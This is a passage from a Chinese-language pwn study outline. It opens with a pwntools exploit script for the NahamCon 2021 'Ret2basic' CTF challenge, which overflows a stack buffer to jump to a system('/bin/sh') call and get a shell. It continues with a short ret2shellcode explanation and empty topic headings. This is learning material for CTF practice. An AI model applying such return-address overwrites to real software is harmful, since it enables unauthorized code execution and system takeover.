> # NahamCon 2021 (ctf.nahamcon.com): Ret2basic # 
> # 0x0000000000401334   call    _gets
> from pwn import *
> context.log_level = 'debug'
> sh = remote('challenge.nahamcon.com', 30413)
> # 这个是前面分析的 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
> target = 0x0000000000401215
> payload = b'A' * (0x70 + 8) + p64(target)  # 这里是前面分析的字符串 s 与 return address 之间的偏移量
> sh.sendline(payload)
> sh.interactive()
> ```



#### ret2shellcode

- 控制程序执行shellcode代码
- shellcode: 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell
- 通常，shellcode 需要自行填充。这是另外一种典型的利用方法，即此时需要自己填充一些可执行的代码。(ret2text则是利用程序自身的代码)
- 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限



- TBD





### Fancy Stack Overflow

> 花式栈溢出



## 格式化字符串漏洞



## Glibc Heap Utilization

> Glibc Heap利用



## **IO\_FILE** Utilization



## Race Condition

> 条件竞争

## 整数溢出



## 沙箱逃逸



## Kernel









---

# Windows Pwn

